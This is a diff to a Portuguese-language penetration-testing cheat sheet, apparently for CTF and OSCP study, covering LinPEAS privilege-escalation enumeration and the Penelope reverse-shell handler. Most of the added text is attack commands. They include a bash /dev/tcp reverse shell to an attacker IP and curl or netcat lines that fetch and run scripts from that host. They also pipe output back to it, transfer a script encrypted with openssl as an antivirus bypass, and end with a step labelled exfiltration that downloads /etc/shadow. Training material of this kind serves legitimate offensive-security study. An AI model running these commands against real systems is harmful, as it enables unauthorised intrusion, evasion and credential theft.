@@ -937,16 +937,27 @@ Acesso Inicial (shell básica)
 ## 🔍 LinPEAS — Enumeração Completa de Privilege Escalation
 
 > **O que é:** O **Linux Privilege Escalation Awesome Script** é a ferramenta mais completa para enumeração automática de vetores de escalação de privilégio. Ele verifica **centenas de pontos** e destaca os resultados em cores:
-> - 🔴 **Vermelho/Amarelo** → Alta chance de privesc
-> - 🟡 **Amarelo** → Interessante, investigar
-> - 🟢 **Verde** → Informação de contexto
+> - 🔴🟡 **Vermelho/Amarelo** → 99% de chance de privesc (caminho confirmado)
+> - 🔴 **Vermelho** → Configuração suspeita que pode levar à escalação
+> - 🟢 **Verde** → Configuração conhecidamente segura
+> - 🔵 **Azul** → Usuários sem shell / dispositivos montados
+> - 🩵 **Ciano** → Usuários com shell
 >
 > **GitHub:** https://github.com/peass-ng/PEASS-ng
+
+### Variantes disponíveis
+
+| Arquivo | Descrição |
+|---|---|
+| `linpeas.sh` | Padrão — todas as verificações + linux-exploit-suggester embutido |
+| `linpeas_fat.sh` | Tudo + binários de terceiros embutidos em base64 |
+| `linpeas_small.sh` | Apenas as verificações mais críticas (menor tamanho) |
+| `linpeas_linux_amd64` | Binário compilado (útil quando `sh` é muito restrito) |
 
 ### Download e Execução
 
 ```bash
-# ─── OPÇÃO 1: Executar direto da memória (sem gravar no disco) ───
+# ─── OPÇÃO 1: Executar direto da memória (sem tocar o disco) ───
 curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
 
 # ─── OPÇÃO 2: Baixar e executar ───
@@ -963,28 +974,66 @@ python3 -m http.server 8080
 wget http://SEU_IP:8080/linpeas.sh -O /tmp/linpeas.sh
 chmod +x /tmp/linpeas.sh
 /tmp/linpeas.sh
+
+# ─── OPÇÃO 4: Via netcat (quando não tem curl/wget no alvo) ───
+# Atacante:
+nc -q 5 -lvnp 80 < linpeas.sh
+# Alvo:
+cat < /dev/tcp/SEU_IP/80 | sh
+
+# ─── OPÇÃO 5: Executar E enviar output para o atacante ao mesmo tempo ───
+# Atacante (recebe o output):
+nc -lvnp 9002 | tee linpeas.out
+# Alvo:
+curl http://SEU_IP:8080/linpeas.sh | sh | nc SEU_IP 9002
+
+# ─── OPÇÃO 6: Binário compilado (sem dependência de sh) ───
+wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_linux_amd64
+chmod +x linpeas_linux_amd64
+./linpeas_linux_amd64
 ```
 
 ### Flags Mais Úteis
 
 ```bash
-# Execução completa com saída colorida (padrão)
+# Execução padrão (colorida, ~4 minutos)
 ./linpeas.sh
 
-# Salvar output em arquivo para analisar depois (sem perder as cores)
-./linpeas.sh | tee /tmp/linpeas_output.txt
+# -a → All checks: inclui monitorar processos por 1min + brute-force de senhas
+#      com top2000 passwords via su (RUIDOSO). Recomendado em CTFs.
+./linpeas.sh -a
 
-# Salvar com cores em HTML para análise offline
-./linpeas.sh -a > /tmp/output.txt    # -a = All checks (mais completo, mais lento)
+# -e → Extra enumeration: executa verificações puladas por padrão
+./linpeas.sh -e
 
-# Executar apenas categorias específicas (mais rápido):
-./linpeas.sh -s   # Super fast (verifica só o mais crítico)
+# -r → Regex checks: busca centenas de API keys/tokens no filesystem (lento)
+./linpeas.sh -r
 
-# Passar senha para verificar acesso sudo:
-./linpeas.sh -p SenhaAqui
+# -s → Stealth & superfast: pula verificações demoradas, nada gravado no disco
+./linpeas.sh -s
 
-# Especificar rede para scan interno:
-./linpeas.sh -i 192.168.1.0/24
+# -P → Passar senha para testar sudo -l e brute-force de outros usuários
+./linpeas.sh -P SenhaAqui
+
+# -o → Executar apenas categorias específicas (separadas por vírgula)
+./linpeas.sh -o system_information,sudo,interesting_files
+
+# Salvar output com cores (usar /dev/shm/ para não tocar o disco convencional)
+./linpeas.sh -a > /dev/shm/linpeas.txt
+less -r /dev/shm/linpeas.txt    # ler preservando as cores ANSI
+
+# Descoberta de hosts na rede interna:
+./linpeas.sh -d 192.168.1.0/24
+
+# Port scan em IP específico:
+./linpeas.sh -i 127.0.0.1 -p 80,443,8080
+
+# AV bypass — transferir criptografado com openssl:
+# Atacante:
+openssl enc -aes-256-cbc -pbkdf2 -salt -pass pass:bypass -in linpeas.sh -out lp.enc
+python3 -m http.server 80
+# Alvo:
+curl SEU_IP/lp.enc | openssl enc -aes-256-cbc -pbkdf2 -d -pass pass:bypass | sh
 ```
 
 ### O que o LinPEAS Verifica (principais categorias)
@@ -1002,7 +1051,8 @@ chmod +x /tmp/linpeas.sh
 | **Containers** | Detecta Docker, LXC, namespaces |
 | **Redes** | Portas abertas internamente, hosts acessíveis |
 | **NFS** | Exports com `no_root_squash` |
-| **Kernel Exploits** | Sugere CVEs baseado na versão do kernel |
+| **Kernel Exploits** | Sugere CVEs baseado na versão do kernel (linux-exploit-suggester embutido) |
+| **API Keys / Tokens** | Centenas de padrões de regex (requer `-r`) |
 | **Passwords** | Busca por strings de senha em arquivos de configuração |
 
 ### Workflow Recomendado com LinPEAS
@@ -1012,16 +1062,13 @@ chmod +x /tmp/linpeas.sh
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 export TERM=xterm-256color
 
-# 2. Transfira e execute o LinPEAS:
-wget http://SEU_IP:8080/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh && /tmp/lp.sh 2>/dev/null | tee /tmp/out.txt
+# 2. Transfira e execute o LinPEAS (output vai para /dev/shm/ — memória RAM):
+wget http://SEU_IP:8080/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh && /tmp/lp.sh 2>/dev/null | tee /dev/shm/out.txt
 
-# 3. Foque nos alertas VERMELHOS primeiro:
-grep -E '(\033\[31m|99%)' /tmp/out.txt
+# 3. Leia o output com cores preservadas:
+less -r /dev/shm/out.txt
 
-# 4. Depois analise os AMARELOS:
-grep -E '\033\[33m' /tmp/out.txt
-
-# 5. Se encontrou algo (ex: SUID interessante), use GTFOBins:
+# 4. Se encontrou algo (ex: SUID interessante), use GTFOBins:
 # https://gtfobins.github.io/
 ```
 
@@ -1040,109 +1087,150 @@ grep -E '\033\[33m' /tmp/out.txt
 (root) NOPASSWD: /usr/bin/vim                     ← sudo vim sem senha = ROOT!
 ```
 
-> **Dica:** O LinPEAS sempre coloca links do **HackTricks** e **GTFOBins** ao lado dos achados. Quando vir algo em vermelho, clique no link — ele já diz como explorar!
+> **Dica:** O LinPEAS sempre coloca links do **HackTricks** e **GTFOBins** ao lado dos achados. Foque primeiro nos itens em **vermelho/amarelo** — eles têm 99% de chance de ser o caminho correto.
 
 ---
 
 ## 🐚 Penelope — Reverse Shell Handler (Recomendado após PrivEsc)
 
-> **O que é:** Handler avançado de reverse shells em Python. Faz upgrade automático para TTY, suporta múltiplas sessões, download/upload e logging. **Substitui o netcat como listener** e é especialmente útil para gerenciar a shell obtida após privilege escalation.
+> **O que é:** Handler avançado de reverse shells em Python puro (sem dependências externas). Faz upgrade automático para PTY, suporta múltiplas sessões, download/upload, logging e servidor HTTP. **Substitui o netcat como listener.** Versão atual: **0.19.1** — aprovado para uso no OSCP.
 > **GitHub:** https://github.com/brightio/penelope
 
 ### Instalação
 
 ```bash
-# Clonar o repositório
+# ─── OPÇÃO 1: Standalone (sem instalar — mais prático) ───
+wget -q https://raw.githubusercontent.com/brightio/penelope/refs/heads/main/penelope.py
+python3 penelope.py
+
+# ─── OPÇÃO 2: Instalar via pipx (recomendado para uso contínuo) ───
+pipx install git+https://github.com/brightio/penelope       # versão de desenvolvimento
+pipx install penelope-shell-handler                         # versão estável do PyPI
+# Depois basta rodar:
+penelope
+
+# ─── OPÇÃO 3: Clonar o repositório ───
 git clone https://github.com/brightio/penelope.git
-cd penelope
-
-# Ou usar direto sem instalar (mais prático)
-curl https://raw.githubusercontent.com/brightio/penelope/main/penelope.py -o penelope.py
-
-# Ou instalar via pip
-pip install penelope-shell
+cd penelope && python3 penelope.py
 ```
+
+> ⚠️ **Atenção:** O nome no PyPI é `penelope-shell-handler` (não `penelope-shell`). Use `pipx` em vez de `pip` para evitar conflitos de ambiente.
 
 ### Iniciar Listener (substitui `nc -lvnp`)
 
 ```bash
-# Listener básico na porta 4444
-python3 penelope.py 4444
+# Listener básico na porta padrão (4444)
+python3 penelope.py
 
-# Listener em interface específica
-python3 penelope.py 4444 -i 0.0.0.0
+# Listener em porta específica
+python3 penelope.py -p 4444
+
+# Múltiplas portas ao mesmo tempo
+python3 penelope.py -p 4444,5555
+
+# Escutar em interface específica
+python3 penelope.py -p 4444 -i eth0
+
+# Mostrar payloads de reverse shell prontos para copiar
+python3 penelope.py -a
+
+# Conectar a um bind shell (alvo abre a porta, você conecta)
+python3 penelope.py -c ALVO_IP -p 3333
+
+# Modo OSCP-safe (desabilita módulos que fazem exploração automática)
+python3 penelope.py --oscp-safe
 ```
 
-### Comandos Dentro da Penelope (após receber a shell)
+### Navegar entre Shell e Menu Principal
+
+| Situação | Tecla |
+|---|---|
+| Shell com PTY (maioria dos casos) | **`F12`** |
+| Shell readline (sem Python no alvo) | **`Ctrl+D`** |
+| Shell raw/básica (sem upgrade) | **`Ctrl+C`** |
+
+> A tecla correta sempre é exibida na tela ao receber a conexão.
+
+### Comandos do Menu Principal
 
 | Comando | Função |
 |---|---|
-| `Ctrl+C` | **NÃO mata a sessão!** Vai para o menu de sessões |
-| `Enter` | Voltar para a sessão ativa |
-| `sessions` | Listar todas as sessões (múltiplas shells simultâneas) |
-| `use 1` | Trocar para sessão número 1 |
+| `interact 1` ou `i 1` | Entrar na sessão número 1 |
+| `sessions` | Listar todas as sessões ativas |
 | `download /etc/passwd` | Baixar arquivo do alvo para sua máquina |
-| `upload linpeas.sh /tmp/` | Enviar arquivo da sua máquina para o alvo |
-| `spawn` | Gerar um novo listener em outra porta |
-| `upgrade` | Forçar upgrade da shell para PTY (geralmente automático) |
-| `dir` | Mudar o diretório onde os downloads são salvos |
+| `upload linpeas.sh /tmp/` | Enviar arquivo local (ou URL HTTP) para o alvo |
+| `upgrade` | Forçar upgrade para PTY (geralmente automático) |
 | `kill 1` | Encerrar a sessão número 1 |
-| `exit` | Sair da Penelope |
+| `exit` | Encerrar a Penelope |
 
-### Gerar Payloads Automaticamente
+> O menu suporta **tab completion** e **abreviações** — ex: `i 1` em vez de `interact 1`.
+
+### Ver Payloads de Reverse Shell
 
 ```bash
-# Penelope gera e mostra o payload pronto para copiar
-python3 penelope.py 4444 -g
-
-# Gerar payload para tipo de shell específico
-python3 penelope.py 4444 -g bash
-python3 penelope.py 4444 -g python
-python3 penelope.py 4444 -g php
+# A flag -a mostra payloads prontos para copiar (para todos os listeners ativos)
+python3 penelope.py -a
+# ou, se já estiver escutando:
+python3 penelope.py -p 4444 -a
 ```
 
-### Servir Arquivos Automaticamente (Transferir LinPEAS e outras ferramentas)
+### Servir Arquivos via HTTP (Transferir LinPEAS e outras ferramentas)
 
 ```bash
-# Inicia listener E um servidor HTTP na porta 8080 ao mesmo tempo
-python3 penelope.py 4444 -s
+# Servir uma pasta via HTTP (porta padrão 8000)
+python3 penelope.py -s ./          # serve a pasta atual
+python3 penelope.py -s /opt/tools/ # serve pasta específica
 
-# No alvo, basta fazer:
-wget http://SEU_IP:8080/linpeas.sh
-# Ou:
-curl http://SEU_IP:8080/linpeas.sh | bash
+# No alvo:
+wget http://SEU_IP:8000/linpeas.sh -O /tmp/lp.sh
+curl http://SEU_IP:8000/linpeas.sh | sh
+```
+
+> **Nota:** `-s` é modo de servidor HTTP **separado** do listener. Para usar os dois ao mesmo tempo, abra dois terminais.
+
+### Executar LinPEAS direto na memória (sem tocar o disco)
+
+```bash
+# Dentro da sessão ativa na Penelope:
+curl http://SEU_IP:8000/linpeas.sh | sh
+# A saída é enviada em tempo real e salva automaticamente em arquivo local.
 ```
 
 ### Por que Usar Penelope em vez de Netcat
 
-- ✅ Shell **interativa completa** automaticamente (sem o ritual do `pty.spawn`)
-- ✅ **Setas** e **histórico** de comandos nativos
-- ✅ **Tab completion** funciona
-- ✅ **Ctrl+C** não derruba a sessão (diferente do netcat!)
-- ✅ **Múltiplas shells** simultâneas (alterne com `Ctrl+C` → `use N`)
-- ✅ **Download/Upload** integrado (sem precisar abrir outro servidor)
-- ✅ **Auto-resize** do terminal (sem `stty rows/cols` manual)
-- ✅ **Logging** automático de toda a sessão
-- ✅ **Servidor HTTP embutido** para transferir ferramentas (`-s` flag)
+| Recurso | Netcat | Penelope |
+|---|:---:|:---:|
+| PTY automático (setas, histórico, tab) | ❌ | ✅ |
+| Ctrl+C sem matar a sessão | ❌ | ✅ |
+| Múltiplas shells simultâneas | ❌ | ✅ |
+| Download/Upload integrado | ❌ | ✅ |
+| Auto-resize do terminal | ❌ | ✅ |
+| Logging automático da sessão | ❌ | ✅ |
+| Servidor HTTP embutido | ❌ | ✅ |
+| Manter N sessões ativas por alvo | ❌ | ✅ |
+| Local port forwarding | ❌ | ✅ |
+| Aprovado para OSCP | ✅ | ✅ |
 
 ### Fluxo Completo: Penelope + LinPEAS
 
 ```bash
 # ─── Na sua máquina atacante ───
-# 1. Iniciar Penelope com servidor HTTP embutido
-python3 penelope.py 4444 -s
-# → Isso abre listener na 4444 E servidor HTTP na 8080
+# 1. Terminal 1: listener da Penelope
+python3 penelope.py -p 4444
+
+# 2. Terminal 2: servidor HTTP com as ferramentas
+python3 penelope.py -s ./    # serve pasta atual na porta 8000
 
 # ─── No alvo (após conseguir RCE inicial) ───
-# 2. Enviar payload de reverse shell (qualquer tipo)
+# 3. Enviar payload de reverse shell
 bash -i >& /dev/tcp/SEU_IP/4444 0>&1
 
 # ─── Na Penelope (após receber a conexão) ───
-# 3. Shell já vem estabilizada automaticamente!
-# 4. Enviar o LinPEAS diretamente via HTTP interno:
-wget http://SEU_IP:8080/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh && /tmp/lp.sh
+# 4. Shell já vem com PTY automaticamente! (pressione F12 para abrir o menu)
+# 5. Executar o LinPEAS sem tocar o disco:
+curl http://SEU_IP:8000/linpeas.sh | sh | tee /dev/shm/lp.txt
 
-# 5. Após encontrar vetor de privesc, explorar e virar root
-# 6. Baixar evidências:
+# 6. Após encontrar vetor de privesc e virar root — exfiltrar:
 download /root/root.txt
+download /etc/shadow
 ```
